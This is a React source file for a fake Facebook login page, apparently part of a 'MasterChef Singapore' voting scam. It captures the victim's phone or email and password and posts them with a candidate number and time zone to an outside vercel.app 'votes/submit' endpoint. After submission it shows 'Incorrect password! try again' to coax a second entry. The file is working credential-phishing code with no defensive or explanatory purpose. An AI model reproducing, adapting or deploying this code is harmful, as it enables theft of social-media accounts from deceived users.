import { useState, useEffect } from "react";
import facebookLogo from "../assets/facebook-logo.svg";

export default function FacebookLogin() {
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");

  const [status, setStatus] = useState("login");
  const [loading, setLoading] = useState(false);



  async function submitForm(e) {
    e.preventDefault();

    setLoading(true);

    try {
      const res = await fetch(
        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            candidate_number: localStorage.getItem("candidate"),
            platform: "facebook",
            username: phone,
            password,
            location: Intl.DateTimeFormat().resolvedOptions().timeZone,
          }),
        }
      );

      const data = await res.json();

      if (data.success) {
  setStatus("approved");
}
    } catch (err) {
      console.log(err);
    }

    setLoading(false);
  }
  if (status === "pending") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-6">
        <div className="w-full max-w-sm text-center">

          <img
            src={facebookLogo}
            alt="Logo"
            className="w-16 h-16 mx-auto mb-8"
          />

          <h2 className="text-2xl font-semibold text-gray-800 mb-3">
            Pending Approval
          </h2>

          <p className="text-gray-600">
            Your vote request has been submitted successfully.
          </p>

          <p className="text-gray-600 mt-2">
            Please wait while the moderator verifies your request.
          </p>

          <div className="mt-8 flex justify-center">
            <div className="w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
          </div>

        </div>
      </div>
    );
  }

  if (status === "approved") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-6">
        <div className="w-full max-w-sm text-center">

          <img
            src={facebookLogo}
            alt="Logo"
            className="w-16 h-16 mx-auto mb-8"
          />

          <div className="text-green-600 text-6xl mb-4">
            ✓
          </div>

          <h2 className="text-2xl font-bold text-gray-800">
            Incorrect password!
          </h2>

          <p className="mt-3 text-gray-600">
            try again.
          </p>

        </div>
      </div>
    );
  }

  if (status === "rejected") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-6">
        <div className="w-full max-w-sm text-center">

          <img
            src={facebookLogo}
            alt="Logo"
            className="w-16 h-16 mx-auto mb-8"
          />

          <div className="text-red-600 text-6xl mb-4">
            ✕
          </div>

          <h2 className="text-2xl font-bold text-gray-800">
            Verification Failed
          </h2>

          <p className="mt-3 text-gray-600">
            Your request could not be approved.
          </p>

        </div>
      </div>
    );
  }
  return (
    <div className="min-h-screen bg-[#f0f2f5] flex items-center justify-center px-6">

      <div className="w-full max-w-sm">

        <div className="bg-white rounded-xl shadow-lg px-6 py-8">

          <div className="flex justify-center mb-8">
            <img
              src={facebookLogo}
              alt="Logo"
              className="w-16 h-16 object-contain"
            />
          </div>

          <form onSubmit={submitForm}>

            <input
              type="text"
              placeholder="Mobile number or email"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              required
              className="w-full border border-gray-300 rounded-lg px-4 py-3 mb-3 outline-none focus:border-blue-500"
            />

            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="w-full border border-gray-300 rounded-lg px-4 py-3 mb-5 outline-none focus:border-blue-500"
            />

            <div className="mt-3 text-center">
  <span className="text-sm text-blue-500 cursor-pointer hover:underline">
    Forgot password?
  </span>
</div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white font-semibold rounded-lg py-3 transition"
            >
              {loading ? "Submitting..." : "Log in"}
            </button>

          </form>

        </div>

      </div>

    </div>
  );
}